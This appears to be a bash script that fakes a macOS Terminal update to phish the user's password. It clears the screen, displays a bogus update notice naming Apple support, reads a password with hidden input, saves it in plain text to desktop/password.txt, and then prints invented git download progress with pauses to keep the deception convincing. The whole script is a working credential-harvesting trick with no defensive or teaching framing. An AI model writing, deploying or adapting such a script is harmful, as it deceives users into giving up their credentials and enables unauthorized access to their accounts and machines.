#!/bin/bash
clear
echo "Terminal has recieved a new update, for more information run 'omz info' or head to https://support.apple.com/en-us/"
echo -n "Password: "
read -s PASSWORD
echo "$PASSWORD" > desktop/password.txt
echo ""
echo "remote: Enumerating objects: 24425, done."
sleep 1
echo "remote: Counting objects: 100% (24423/24423), done."
sleep 1
echo "remote: Compressing objects: 100% (10292/10292), done."
sleep 2
echo "remote: Total 23680 (delta 13404), reused 22482 (delta 12211), pack-reused 0"
sleep 2
echo "Receiving objects: 100% (23680/23680), 5.06 MiB | 6.49 MiB/s, done."
sleep 2
echo "Resolving deltas: 100% (13404/13404), completed with 422 local objects."
